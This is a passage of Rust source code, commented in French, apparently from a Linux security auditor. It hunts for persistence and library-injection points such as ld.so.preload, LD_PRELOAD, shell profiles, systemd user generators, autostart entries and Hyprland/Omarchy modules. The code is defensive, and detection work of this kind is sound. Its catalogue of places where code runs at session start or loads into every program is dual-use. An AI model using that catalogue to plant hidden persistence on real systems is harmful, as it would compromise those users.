            "{} drop-in files for this unit, more than the {AJOUTS_MAX} re-read at each check",
            ajouts.len()
        )));
    }
    for a in ajouts {
        let (etat, t) = lire_ajout(r, &a)?;
        lies.push((r.montre(&a), etat));
        textes.push((a, t));
    }
    let maison = r.maison.to_string_lossy().into_owned();
    let contexte = if utilisateur {
        designes::Contexte::Unite(Some(&maison))
    } else {
        designes::Contexte::Unite(None)
    };
    let signalee = ligne.map(|l| l.trim_matches([' ', '\t']));
    for (f, t) in &textes {
        for (_, commande, logique) in lignes_exec(t) {
            if f == fichier && signalee.is_none_or(|l| l == logique) {
                continue;
            }
            let d = designes::commande(&commande, contexte);
            let montree = crate::ui::couper(&crate::ui::affichable(&logique), 60);
            for (chemin, etat) in cibles(r, d, &logique, true)? {
                lies.push((format!("{montree} → {chemin}"), etat));
            }
        }
    }
    Ok(lies)
}

/// Le dossier personnel, en texte, pour déplier « %h/ » d'une unité de l'utilisateur.
fn maison_texte(t: &Lancements) -> String {
    t.r.maison.to_string_lossy().into_owned()
}

/// La ligne `l` (lue par `lines()`) telle qu'écrite dans `texte`, coupée au seul « \n » comme la relit le fils root.
fn telle_qu_ecrite(texte: &str, l: &str) -> String {
    texte
        .split('\n')
        .find(|r| r.strip_suffix('\r').unwrap_or(r) == l)
        .unwrap_or(l)
        .to_string()
}

/// Le fichier et la ligne à retirer, pour `Lancements::retraits`.
fn retrait(f: &Path, texte: &str, l: &str) -> Option<(String, String)> {
    Some((f.to_str()?.to_string(), telle_qu_ecrite(texte, l)))
}

/// /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris. Technique
/// classique des rootkits ; presque aucun système normal n'en a. Puis LD_PRELOAD et LD_AUDIT de cette session.
fn lire_prechargement(
    racine: &Path,
    variable: &impl Fn(&str) -> Option<std::ffi::OsString>,
    gestion: Option<Paquets>,
    t: &mut Lancements,
) {
    let preload = racine.join("etc/ld.so.preload");
    let h = t.r.maison.clone();
    if let Some(lu) = lire(&preload, &h, t) {
        // Coupée comme la coupe le chargeur : espace, tabulation, « : ».
        let libs: Vec<(usize, &str, &str)> = lu
            .texte
            .lines()
            .enumerate()
            .filter(|(_, l)| !commentaire(l))
            .flat_map(|(n, l)| {
                l.split([' ', '\t', ':'])
                    .filter(|m| !m.is_empty())
                    .map(move |lib| (n, l, lib))
            })
            .collect();
        for (n, ligne, lib) in libs {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            t.sources.push(source_de("preload", lib));
            t.retraits.push(retrait(&preload, &lu.texte, ligne));
            let d = designes::bibliotheques(lib, designes::Liste::Fichier);
            let temoin = temoin_de_ligne(t, &preload, n, &lu, ligne, d, false, Sorte::Shell);
            t.temoins.push(temoin);
            // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
            let lib = crate::ui::affichable(lib);
            if connue {
                t.suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                t.critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
            let valeur = v.to_string_lossy();
            t.sources.push(source_de(&format!("env:{var}"), &valeur));
            t.retraits.push(None);
            // Hors du périmètre déclarable : une variable de la session, sans fichier à lier.
            t.temoins.push(Err(hors_des_deux(&trf!(
                "{var} de cette session",
                "{var} of this session"
            ))));
            t.suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                crate::ui::affichable(&v.to_string_lossy())
            ));
        }
    }
}

/// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte.
fn fichiers_de_configuration(r: &Releveur) -> Vec<std::path::PathBuf> {
    let h = &r.maison;
    let etc = |chemin: &str| r.racine.join(chemin);
    let mut configuration: Vec<std::path::PathBuf> = [
        "etc/environment",
        "etc/profile",
        "etc/bash.bashrc",
        "etc/zsh/zshenv",
        "etc/zsh/zprofile",
        "etc/zsh/zshrc",
        "etc/zsh/zlogin",
        "etc/fish/config.fish",
    ]
    .iter()
    .map(|c| etc(c))
    .collect();
    configuration.extend(fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&etc("etc/fish/conf.d"), &["fish"]));
    // ~/.bash_login, ~/.zlogin et fish aussi (vérification de la campagne E) : chacun lit du code à l'ouverture.
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bash_login",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".zlogin",
            ".zlogout",
            ".bash_logout",
            ".xprofile",
            ".xsessionrc",
            ".config/fish/config.fish",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/fish/conf.d"), &["fish"]));
    if let Some(z) = &r.zdot {
        for f in [".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout"] {
            configuration.push(r.sous(&z.join(f)));
        }
    }
    if let Some(c) = &r.config {
        configuration.push(r.sous(&c.join("fish/config.fish")));
        configuration.extend(fichiers_de(&r.sous(&c.join("fish/conf.d")), &["fish"]));
    }
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    // L'environnement que le gestionnaire de systemd du compte donne à chaque unité (relecture adverse 2, N8).
    configuration.push(etc("etc/systemd/user.conf"));
    configuration.extend(fichiers_de(&etc("etc/systemd/user.conf.d"), &["conf"]));
    configuration.push(h.join(".config/systemd/user.conf"));
    configuration.extend(fichiers_de(&h.join(".config/systemd/user.conf.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    let mut env: Vec<std::path::PathBuf> = std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
        .filter(|f| f.file_name().to_string_lossy().starts_with("env") && f.path().is_file())
        .map(|f| f.path())
        .collect();
    // Dans l'ordre des noms, comme `fichiers_sous` : le verdict ne dépend pas du système de fichiers.
    env.sort();
    configuration.extend(env);
    configuration
}

/// L'identité du compte qui lit (celle de /proc/self) ; dans les essais, celle qu'ils choisissent (1000 sinon).
#[cfg_attr(test, allow(clippy::unnecessary_wraps))]
fn uid_du_compte() -> Option<u32> {
    #[cfg(test)]
    {
        Some(tests::UID_DU_COMPTE.with(std::cell::Cell::get))
    }
    #[cfg(not(test))]
    {
        use std::os::unix::fs::MetadataExt as _;
        std::fs::metadata("/proc/self").ok().map(|m| m.uid())
    }
}

/// Les dossiers d'unités que systemd lit en plus des habituels (`Ajout::Dossier`) : ~/.config/systemd/user.attached
/// (et celui d'un XDG_CONFIG_HOME déplacé), chaque XDG_CONFIG_DIRS et XDG_DATA_DIRS que le compte peut changer (sous
/// son dossier personnel, ou pas à root seul), et ceux du dossier de session de systemd quand XDG_RUNTIME_DIR mène
/// ailleurs. Tels que lus sous la racine.
fn dossiers_ajoutes(r: &Releveur) -> Vec<std::path::PathBuf> {
    let mut dossiers = vec![r.maison.join(".config/systemd/user.attached")];
    if let Some(c) = &r.config {
        dossiers.push(r.sous(&c.join("systemd/user.attached")));
    }
    for d in r.config_systeme.iter().chain(&r.donnees_systeme) {
        let lu = r.sous(&d.join("systemd/user"));
        let habituel = [".config/systemd/user", ".local/share/systemd/user"]
            .iter()
            .any(|h| lu == r.maison.join(h));
        if !habituel && (lu.starts_with(&r.maison) || !de_root_seul(&lu)) {
            dossiers.push(lu);
        }
    }
    if let Some(autre) = &r.session_de_systemd {
        dossiers.extend(DOSSIERS_DE_LA_SESSION.iter().map(|d| r.sous(&autre.join(d))));
    }
    let mut vus = std::collections::BTreeSet::new();
    dossiers.retain(|d| vus.insert(d.clone()));
    dossiers
}

/// Les dossiers d'unités de l'utilisateur sous le dossier de la session (XDG_RUNTIME_DIR), dans l'ordre de systemd.
const DOSSIERS_DE_LA_SESSION: [&str; 7] = [
    "systemd/user.control",
    "systemd/transient",
    "systemd/generator.early",
    "systemd/user",
    "systemd/user.attached",
    "systemd/generator",
    "systemd/generator.late",
];

/// Un dossier où se rangent des lancements, qui ne se lit pas : une ligne de l'alerte, non vérifié.
/// Une ligne de l'alerte qui ne vient pas d'une ligne d'un fichier (un lien, une inclusion non suivie, un dossier de
/// session à part) : sa `source` (sans langue), ce qui se montre (`suspect`), et pourquoi elle ne se déclare pas.
fn constat_sans_ligne(t: &mut Lancements, source: &str, suspect: String, refus: String) {
    t.sources.push(source_de("lancements", source));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(refus)));
    t.suspects.push(suspect);
}

fn dossier_illisible(t: &mut Lancements, chemin: &Path, e: &std::io::Error) {
    let montre = crate::ui::affichable(&t.r.montre(chemin));
    t.sources
        .push(source_de("maison", &format!("illisible {}", t.r.montre(chemin))));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(trf!(
        "{montre} ne se lit pas : ce qu'il lance n'est pas vérifié",
        "{montre} cannot be read: what it starts is not checked"
    ))));
    t.suspects.push(trf!(
        "{montre} ne se lit pas ({e}) : ce qu'il lance n'est pas vérifié",
        "{montre} cannot be read ({e}): what it starts is not checked"
    ));
}

/// Au plus autant de programmes lus dans un dossier de générateurs ; au-delà, le reste n'est pas vérifié (dit).
const GENERATEURS_MAX: usize = 256;

/// Les générateurs de systemd des sessions : des programmes que le gestionnaire de la session lance à chaque
/// démarrage, avec les droits du compte, avant toute unité (ceux de « user-environment-generators » posent en plus
/// les variables de toutes les unités). Dans un dossier du compte (~/.config/systemd/user-generators, et
/// user-environment-generators, ou sous un XDG_CONFIG_HOME déplacé), tout programme est levé : rien de normal ne s'y
/// range (systemd 262 ne lit pas ces dossiers-là, une autre version ou un autre gestionnaire pourrait). Dans un
/// dossier du système (/run, /etc, /usr/local/lib, /usr/lib), seul ce que le compte a pu poser ou changer est levé
/// (`pose_par_le_compte`) : ceux des paquets, à root, ne lèvent rien. Un lien vers /dev/null (un générateur masqué) ne
/// lance rien. Rien de tout cela ne se déclare normal.
fn juger_generateurs(t: &mut Lancements) {
    const NOMS: [&str; 2] = ["user-generators", "user-environment-generators"];
    let mut dossiers: Vec<(std::path::PathBuf, bool)> = Vec::new();
    let configs = std::iter::once(t.r.maison.join(".config")).chain(t.r.config.iter().map(|c| t.r.sous(c)));
    for c in configs {
        dossiers.extend(NOMS.iter().map(|n| (c.join("systemd").join(n), true)));
    }
    for base in [
        "/run/systemd",
        "/etc/systemd",
        "/usr/local/lib/systemd",
        "/usr/lib/systemd",
    ] {
        dossiers.extend(NOMS.iter().map(|n| (t.r.sous(&Path::new(base).join(n)), false)));
    }
    dossiers.dedup();
    let moi = {
        use std::os::unix::fs::MetadataExt as _;
        std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid())
    };
    let sans_traduction = uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default());
    for (dossier, du_compte) in dossiers {
        let entrees = match std::fs::read_dir(&dossier) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                dossier_illisible(t, &dossier, &e);
                continue;
            }
        };
        let mut chemins: Vec<std::path::PathBuf> = entrees.flatten().map(|e| e.path()).collect();
        chemins.sort();
        if chemins.len() > GENERATEURS_MAX {
            let e = std::io::Error::other(trf!(
                "plus de {GENERATEURS_MAX} fichiers",
                "more than {GENERATEURS_MAX} files"
            ));
            dossier_illisible(t, &dossier, &e);
            chemins.truncate(GENERATEURS_MAX);
        }
        for p in chemins {
            if let Some(raison) = generateur_suspect(&p, &dossier, du_compte, moi, sans_traduction) {
                let ou = crate::ui::affichable(&court(&p, &t.r.maison));
                t.sources.push(source_de(
                    &crate::modele::id::chemin(&p.to_string_lossy()),
                    "générateur",
                ));
                t.retraits.push(None);
                let refus = hors_du_perimetre(&t.r, &p, 0, "", Sorte::Ajoutee(Ajout::Generateur), true)
                    .unwrap_or_else(|| refus_ajoute(Ajout::Generateur, &ou, 0, ""));
                t.temoins.push(Err(refus));
                t.suspects.push(trf!("{ou} : {raison}", "{ou}: {raison}"));
            }
        }
    }
}

/// Pourquoi le fichier `p` du dossier de générateurs `dossier` se lève, ou `None` : pas un programme (ni fichier ni
/// lien vers un fichier exécutable), masqué (lien vers /dev/null), ou d'un paquet dans un dossier du système.
fn generateur_suspect(
    p: &Path,
    dossier: &Path,
    du_compte: bool,
    moi: u32,
    sans_traduction: bool,
) -> Option<&'static str> {
    use std::os::unix::fs::MetadataExt as _;
    if std::fs::read_link(p).is_ok_and(|c| c == Path::new("/dev/null")) {
        return None;
    }
    let lien = std::fs::symlink_metadata(p).ok()?;
    let cible = std::fs::metadata(p).ok()?;
    if !cible.is_file() || cible.mode() & 0o111 == 0 {
        return None;
    }
    if du_compte {
        return Some(tr!(
            "programme dans un dossier de générateurs de systemd du compte : rien de normal ne s'y range (systemd le lancerait à chaque démarrage de la session, avec les droits du compte)",
            "program in an account systemd generator folder: nothing normal goes there (systemd would start it at each session start, with the account's rights)"
        ));
    }
    // Le lien lui-même (sa permission ne dit rien), le programme, son dossier réel et le dossier lu.
    let mut proprietes = vec![(lien.uid(), if lien.is_symlink() { 0 } else { lien.mode() })];
    proprietes.push((cible.uid(), cible.mode()));
    let reel = std::fs::canonicalize(p).ok()?;
    for d in [reel.parent(), Some(dossier)].into_iter().flatten() {
        let Ok(m) = std::fs::metadata(d) else {
            return Some(tr!(
                "générateur de systemd des sessions dont le dossier ne se lit pas : non vérifié",
                "session systemd generator whose folder cannot be read: not checked"
            ));
        };
        proprietes.push((m.uid(), m.mode()));
    }
    pose_par_le_compte(&proprietes, moi, sans_traduction).then_some(tr!(
        "générateur de systemd des sessions que le compte a pu poser ou changer (lui, son lien ou son dossier n'est pas à root seul) : systemd le lance à chaque démarrage de la session",
        "session systemd generator the account could have placed or changed (it, its link or its folder is not root-only): systemd starts it at each session start"
    ))
}

/// Un des fichiers (`proprietes` : propriétaire et permissions de chacun) a pu être posé ou changé par le compte :
/// écrit par le groupe ou les autres, ou pas à root. Dans un espace de noms d'utilisateurs (`sans_traduction` faux),
/// root se voit sous une autre identité et le compte peut se voir root : seul ce qui appartient à l'identité de ce
/// processus (`moi`) compte alors (limite écrite au modèle de menace).
fn pose_par_le_compte(proprietes: &[(u32, u32)], moi: u32, sans_traduction: bool) -> bool {
    proprietes
        .iter()
        .any(|&(uid, mode)| mode & 0o022 != 0 || if sans_traduction { uid != 0 } else { uid == moi })
}

/// Ce que lit le bilan des lancements (`fichiers_de_demarrage`).
#[derive(Default)]
struct Demarrage {
    /// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland).
    fichiers: Vec<std::path::PathBuf>,
    /// Ceux de Hyprland à part, modules d'Omarchy compris : ils sont aussi des fichiers de configuration.
    hypr: Vec<std::path::PathBuf>,
    /// Les dossiers « *.d » d'unités qui sont des liens vers un dossier (relecture adverse, C4).
    liens: Vec<std::path::PathBuf>,
    /// Ce que le parcours des dossiers de Hyprland et des modules d'Omarchy a dit (liens, profondeur).
    parcours: Parcours,
    /// Les modules Lua d'Omarchy lus hors de ~/.config/hypr.
    modules: Vec<std::path::PathBuf>,
    /// Ceux d'entre eux qui passent avant un module du même nom (d'Omarchy ou de ~/.config/hypr).
    masques: Vec<std::path::PathBuf>,
}

/// Les dossiers où le chargeur d'Omarchy (/usr/share/omarchy/default/hypr/bootstrap.lua, toggles.lua,
/// workspace-layouts.lua, omarchy.lua) prend des modules Lua hors de ~/.config/hypr, sous le dossier personnel, et
/// s'ils en masquent un autre. package.path y met « ~/.local/state/?.lua » avant « ~/.config/?.lua », avant
/// /usr/share/omarchy : « require("hypr.x") » prend ~/.local/state/hypr/x.lua avant ~/.config/hypr/x.lua,
/// « require("default.hypr.x") » prend ~/.local/state/default/hypr/x.lua ou ~/.config/default/hypr/x.lua avant
/// l'original ; le thème (« omarchy.current.theme.* »), les bascules et les dispositions s'y lisent aussi.
const MODULES_D_OMARCHY: [(&str, bool); 7] = [
    (".local/state/default", true),
    (".local/state/hypr", true),
    (".config/default", true),
    (".local/state/omarchy/current/theme", false),
    (".config/omarchy/current/theme", false),
    (".local/state/omarchy/toggles/hypr", false),
    (".local/state/omarchy/workspace-layouts", false),
];

/// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), ceux de
/// Hyprland à part, et ce que leur parcours a dit (`Demarrage`).
fn fichiers_de_demarrage(r: &Releveur) -> Demarrage {
    // Les ajouts (« .d/*.conf ») d'un .mount, .target… se lisent aussi : leurs lignes Exec ou leurs dépendances
    // lancent (relecture adverse, B5).
    const UNITES: [&str; 11] = [
        "service",
        "timer",
        "socket",
        "path",
        "conf",
        "mount",
        "automount",
        "swap",
        "target",
        "slice",
        "scope",
    ];
    let h = &r.maison;
    let etc = |chemin: &str| r.racine.join(chemin);
    let mut demarrage = Vec::new();
    let mut liens = Vec::new();
    // Les dossiers d'unités du système et des comptes : les liens y sont des alias ou des activations, vers des
    // unités lues ailleurs.
    for d in ["etc/systemd/system", "etc/systemd/user"] {
        let mut unites = fichiers_et_liens(&etc(d), &UNITES, &mut liens);
        unites.retain(|p| !p.is_symlink());
        demarrage.extend(unites);
    }
    // Ceux du compte, dont user.control (prioritaire) et ~/.local/share (installées par le compte).
    for d in [
        ".config/systemd/user",
        ".config/systemd/user.control",
        ".local/share/systemd/user",
    ] {
        demarrage.extend(fichiers_et_liens(&h.join(d), &UNITES, &mut liens));
    }
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
    let mut parcours = Parcours::default();
    let mut hypr = fichiers_de_hypr(&h.join(".config/hypr"), &mut parcours);
    // XDG_CONFIG_HOME et XDG_DATA_HOME déplacés : systemd et Hyprland y lisent aussi (vérification de la campagne E,
    // N7 ; M-d ne couvrait que le suivi d'une unité déjà acceptée).
    if let Some(c) = &r.config {
        for d in ["systemd/user", "systemd/user.control"] {
            demarrage.extend(fichiers_et_liens(&r.sous(&c.join(d)), &UNITES, &mut liens));
        }
        demarrage.extend(fichiers_de(&r.sous(&c.join("autostart")), &["desktop"]));
        hypr.extend(fichiers_de_hypr(&r.sous(&c.join("hypr")), &mut parcours));
    }
    if let Some(d) = &r.donnees {
        demarrage.extend(fichiers_et_liens(&r.sous(&d.join("systemd/user")), &UNITES, &mut liens));
    }
    // Les services D-Bus de la session que le compte écrit : leur « Exec= » se lit comme une ligne d'unité, plus
    // stricte que le bus (ni code « % » ni variable chez lui : un tel mot est levé, jamais tu).
    for d in r.dossiers_dbus() {
        demarrage.extend(fichiers_de(d, &["service"]));
    }
    // Le dossier de la session : systemd y lit des unités de l'utilisateur (« systemctl --user --runtime », celles de
    // « systemd-run --user » dans transient/, celles des générateurs). Effacées à l'arrêt, elles lancent quand même
    // des programmes pendant la session : jugées par leur contenu, comme les autres (`Ajout::Session`).
    if let Some(s) = &r.session {
        for d in DOSSIERS_DE_LA_SESSION {
            demarrage.extend(fichiers_et_liens(&r.sous(&s.join(d)), &UNITES, &mut liens));
        }
    }
    // Les dossiers que systemd lit en plus des habituels (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, le dossier de
    // session de systemd quand XDG_RUNTIME_DIR mène ailleurs) : `Ajout::Dossier`.
    for d in &r.dossiers_ajoutes {
        demarrage.extend(fichiers_et_liens(d, &UNITES, &mut liens));
    }
    // Les modules d'Omarchy hors de ~/.config/hypr (deuxième vérification, N11) : leurs seuls fichiers Lua, à toute
    // profondeur, liens suivis et dits ; sous un XDG_STATE_HOME déplacé aussi (workspace-layouts.lua l'ajoute).
    let mut dossiers: Vec<(std::path::PathBuf, bool)> = MODULES_D_OMARCHY
        .iter()
        .map(|(d, masque)| (h.join(d), *masque))
        .collect();
    if let Some(e) = &r.etat {
        for (d, masque) in [
            ("default", true),
            ("hypr", true),
            ("omarchy/current/theme", false),
            ("omarchy/toggles/hypr", false),
            ("omarchy/workspace-layouts", false),
        ] {
            dossiers.push((r.sous(&e.join(d)), masque));
        }
    }
    let mut modules = Vec::new();
    let mut masques = Vec::new();
    let mut des_modules = Parcours::default();
    for (d, masque) in dossiers {
        let mut trouves = Vec::new();
        fichiers_sous(&d, &["lua"], true, 0, &mut trouves, &mut des_modules);
        trouves.retain(|f| !hypr.contains(f) && !modules.contains(f));
        if masque {
            masques.extend(trouves.iter().cloned());
        }
        modules.extend(trouves);
    }
    // Un thème range ses images où il veut, liens compris : un lien se dit seulement s'il mène à un module lu.
    des_modules
        .liens_hypr
        .retain(|l| modules.iter().any(|m| m.starts_with(l)));
    parcours.liens_hypr.append(&mut des_modules.liens_hypr);
    parcours.trop_profonds.append(&mut des_modules.trop_profonds);
    // Le moteur de dictée choisi (vérification 3, H3) : dictation-backend.lua d'Omarchy fait « dofile » de
    // <config>/<moteur>/shortcuts.lua, le moteur lu à la 1re ligne de <config>/omarchy/defaults/dictation.
    let mut configs = vec![h.join(".config")];
    configs.extend(r.config.as_ref().map(|c| r.sous(c)));
    for c in configs {
        if let Some(f) = raccourcis_de_dictee(&c)
            && !hypr.contains(&f)
            && !modules.contains(&f)
        {
            modules.push(f);
        }
    }
    hypr.extend(modules.iter().cloned());
    demarrage.extend(hypr.iter().cloned());
    let mut vus = std::collections::BTreeSet::new();
    demarrage.retain(|f| vus.insert(f.clone()));
    Demarrage {
        fichiers: demarrage,
        hypr,
        liens,
        parcours,
        modules,
        masques,
    }
}

/// Le fichier de raccourcis du moteur de dictée qu'Omarchy charge sous ce dossier de configuration, s'il existe :
/// le moteur est la 1re ligne de omarchy/defaults/dictation, coupée comme « read -r » (blancs autour) et de la forme
/// que omarchy-default-dictation accepte (`^[a-z0-9][a-z0-9-]*$`) ; une autre forme n'est pas chargée.
fn raccourcis_de_dictee(config: &Path) -> Option<std::path::PathBuf> {
    use std::io::Read as _;
    let mut debut = Vec::new();
    std::fs::File::open(config.join("omarchy/defaults/dictation"))
        .ok()?
        .take(4096)
        .read_to_end(&mut debut)
        .ok()?;
    let texte = String::from_utf8_lossy(&debut);
    let moteur = texte.lines().next()?.trim_matches([' ', '\t']);
    let premier = moteur.chars().next()?;
    let forme = (premier.is_ascii_lowercase() || premier.is_ascii_digit())
        && moteur
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-');
    let f = config.join(moteur).join("shortcuts.lua");
    (forme && std::fs::metadata(&f).is_ok_and(|m| m.is_file())).then_some(f)
}

/// Dans les fichiers de configuration : un préchargement, ou une commande suspecte hors des lignes de démarrage
/// (jugées à part).
fn juger_configuration(
    configuration: &[std::path::PathBuf],
    demarrage: &[std::path::PathBuf],
    h: &Path,
    t: &mut Lancements,
) {
    let (session, lue) = (home(), t.r.maison.to_string_lossy().into_owned());
    let maisons = [session.as_str(), lue.as_str()];
    for f in configuration {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        for (n, l) in lu.texte.lines().enumerate() {
            if definit_prechargement(l) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let d = designes::prechargement(l);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, false, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f, h),
                    n.saturating_add(1)
                ));
            } else if !commentaire(l)
                && let Some(raison) = variable_de_configuration(l, &maisons)
                    .or_else(|| (!demarrage.contains(f)).then(|| commande_suspecte(l, false)).flatten())
            {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let d = designes::commande(l, designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
        juger_lignes_jointes(f, &lu, demarrage, h, t);
    }
}

/// Pourquoi une ligne d'un fichier de configuration pose une variable de recherche ou d'injection qui mène à un
/// dossier caché ou temporaire (`variable_suspecte`), ou `None` : « NOM=valeur » (environment.d, profils, avec
/// « export », « declare -x »), « setenv NOM valeur » (csh), « set -gx NOM valeur » (fish), et les variables de
/// « DefaultEnvironment= » et « ManagerEnvironment= » (user.conf de systemd ; relecture adverse 2, N8).
fn variable_de_configuration(ligne: &str, maisons: &[&str]) -> Option<&'static str> {
    let l = ligne.trim();
    // systemd ôte les blancs autour du « = » (vérification 3, P10 : « DefaultEnvironment = A=b »).
    if let Some((cle, v)) = l.split_once('=')
        && ["DefaultEnvironment", "ManagerEnvironment"].contains(&cle.trim_end())
    {
        return commandes_de_systemd(v.trim_start())?
            .into_iter()
            .flatten()
            .find_map(|mot| {
                let (nom, valeur) = affectation(&mot)?;
                variable_suspecte(nom, valeur, maisons)
            });
    }
    for debut in ["setenv ", "set -gx ", "set -x ", "set -Ux "] {
        if let Some(reste) = l.strip_prefix(debut) {
            let (nom, valeur) = reste.trim().split_once([' ', '\t'])?;
            return variable_suspecte(nom, valeur.trim(), maisons);
        }
    }
    let l = ["export ", "declare -x ", "typeset -x ", "readonly "]
        .iter()
        .find_map(|d| l.strip_prefix(d))
        .unwrap_or(l)
        .trim_start();
    let (nom, valeur) = affectation(l)?;
    // La valeur jusqu'au premier blanc hors guillemets : « A=/x b » lance « b » avec A posée.
    let valeur = valeur.split_once([' ', '\t', ';']).map_or(valeur, |(v, _)| v);
    variable_suspecte(nom, valeur, maisons)
}

/// Les lignes continuées par « \ », jointes comme les lit le shell : « export L\⏎D_PRELOAD=… » précharge sans
/// qu'aucune ligne écrite ne nomme LD_PRELOAD. Seulement ce qu'aucune de leurs lignes n'a déjà levé ; sans retrait
/// proposé (retirer la seule première ligne laisserait la suite).
fn juger_lignes_jointes(
    fichier: &Path,
    lu: &Lecture,
    demarrage: &[std::path::PathBuf],
    maison: &Path,
    t: &mut Lancements,
) {
    for (premiere, physiques, jointe) in lignes_du_shell(&lu.texte) {
        if physiques.len() < 2 {
            continue;
        }
        let n = premiere.saturating_sub(1);
        let raison = if definit_prechargement(&jointe) {
            if physiques.iter().any(|(_, l)| definit_prechargement(l)) {
                continue;
            }
            None
        } else if !commentaire(&jointe)
            && !demarrage.iter().any(|d| d == fichier)
            && let Some(raison) = commande_suspecte(&jointe, false)
        {
            if physiques.iter().any(|(_, l)| commande_suspecte(l, false).is_some()) {
                continue;
            }
            Some(raison)
        } else {
            continue;
        };
        t.sources.push(source_de(
            &crate::modele::id::chemin(&fichier.to_string_lossy()),
            &jointe,
        ));
        t.retraits.push(None);
        let (d, commande) = match raison {
            None => (designes::prechargement(&jointe), false),
            Some(_) => (designes::commande(&jointe, designes::Contexte::Shell), true),
        };
        let temoin = temoin_de_ligne(t, fichier, n, lu, &jointe, d, commande, Sorte::Shell);
        t.temoins.push(temoin);
        t.suspects.push(match raison {
            None => trf!(
                "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                "{}:{} preloads a library (LD_PRELOAD)",
                court(fichier, maison),
                premiere
            ),
            Some(raison) => trf!("{}:{} : {raison}", "{}:{}: {raison}", court(fichier, maison), premiere),
        });
    }
}

/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement. Une unité se lit par ses lignes
/// telles que systemd les assemble (`lignes_de_systemd`) ; un .desktop par ses lignes écrites, puis par celles que
/// joint systemd-xdg-autostart-generator ; un fichier de Hyprland par ses lignes, raccourcis compris, et un fichier
/// Lua aussi par ses appels qui lancent une commande (`appels_lua`).
fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
    // Un fichier de Hyprland : un .conf de ses dossiers, ou tout fichier qu'il lit par « source = » quelle que soit
    // son extension (relecture adverse, C6 : « extra.inc » aussi).
    let de_hypr = |f: &Path, r: &Releveur| {
        (r.dans_hypr(f) && a_l_extension(f, "conf"))
            || (r.hypr_inclus.iter().any(|i| i == f) && !a_l_extension(f, "lua"))
    };
    let variables = variables_de_hypr(demarrage.iter().filter(|f| de_hypr(f, &t.r)));
    for f in demarrage {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        let sorte = Sorte::de(f, &t.r);
        let ecrites: Vec<&str> = if a_l_extension(f, "lua") {
            lignes_de_lua(&lu.texte)
        } else {
            lu.texte.lines().collect()
        };
        let mut levees: Vec<usize> = Vec::new();
        let unite = matches!(
            sorte,
            Sorte::Unite { .. } | Sorte::Ajoutee(Ajout::Session | Ajout::Dossier | Ajout::DBus)
        );
        if de_hypr(f, &t.r) {
            juger_hypr(t, f, &lu, &ecrites, sorte, &variables);
        } else if !unite {
            // Un fichier Lua se lit par ses appels (`juger_lua`), qui coupent chaque commande comme le shell ; ici,
            // ses seuls mots.
            let lecteur = if sorte == Sorte::Bureau {
                Lecteur::Bureau
            } else if a_l_extension(f, "lua") {
                Lecteur::Texte
            } else {
                Lecteur::Brut
            };
            for (n, l) in ecrites.iter().enumerate() {
                if let Some((commande, ambigue)) = commande_lancee_lue(l)
                    && juger_lancement(t, f, &lu, n, l, &commande, ambigue, sorte, true, &lecteur)
                {
                    levees.push(n);
                }
            }
        }
        if unite || sorte == Sorte::Bureau {
            let utilisateur = !matches!(sorte, Sorte::Unite { utilisateur: false });
            let lecteur = if sorte == Sorte::Bureau {
                Lecteur::Bureau
            } else {
                let base = Codes::de(utilisateur, &t.r);
